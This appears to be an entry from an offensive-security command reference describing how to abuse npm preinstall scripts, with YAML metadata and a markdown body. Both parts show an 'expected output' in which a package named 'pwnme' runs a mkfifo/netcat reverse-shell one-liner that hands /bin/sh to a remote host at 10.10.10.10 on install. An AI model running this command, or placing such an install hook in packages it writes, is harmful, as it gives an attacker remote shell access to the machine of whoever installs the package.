---
id: 117268c7-a771-473c-8253-ec2e6a64997e
name: npm Install a Package with Preinstall Scripts
type: command
executor: bash
data: npm i $PACKAGE --unsafe
output: 'root@kali:# npm i /home/alice/pwnme --unsafe

  > pwnme@1.0.0 preinstall /home/alice/pwnme

  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f

  npm WARN pwnme@1.0.0 No description

  npm WARN pwnme@1.0.0 No repository field.

  up to date in 46.635s

  found 0 vulnerabilities'
created_at: '2019-10-31T22:50:53.761328+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# npm Install a Package with Preinstall Scripts

```bash
npm i $PACKAGE --unsafe
```

## Expected Output

```
root@kali:# npm i /home/alice/pwnme --unsafe

> pwnme@1.0.0 preinstall /home/alice/pwnme
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f

npm WARN pwnme@1.0.0 No description
npm WARN pwnme@1.0.0 No repository field.

up to date in 46.635s
found 0 vulnerabilities
```
